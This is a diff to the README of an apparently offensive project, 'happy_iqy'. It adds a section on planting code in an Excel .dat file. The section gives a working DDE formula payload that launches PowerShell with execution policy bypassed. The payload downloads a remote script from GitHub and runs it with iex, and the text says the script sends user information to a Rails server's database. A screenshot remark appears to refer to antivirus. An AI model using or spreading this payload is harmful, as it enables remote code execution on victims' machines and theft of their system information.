@@ -499,3 +499,26 @@ UserChannel is streaming from user_channel
 <p align="center">
   <img src="https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/images/ezgif-2-dc35878237.gif"/>
 </p>
+
+
+### Implement code into excel .dat
+
+Let's create a new .dat file which execute a remote command hosted in this github page.
+
+```
+=cmd|' /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/examples/pcinfo.ps1'))"'!notthissheet
+```
+
+Once the file has downloaded, it execute a conection to rails server and add user information into a DB.
+
+#### AV
+
+Once the script is executed.. ups!
+
+<p align="center">
+  <img src="https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/images/2018-09-28_123822.png"/>
+</p>
+
+
+
+
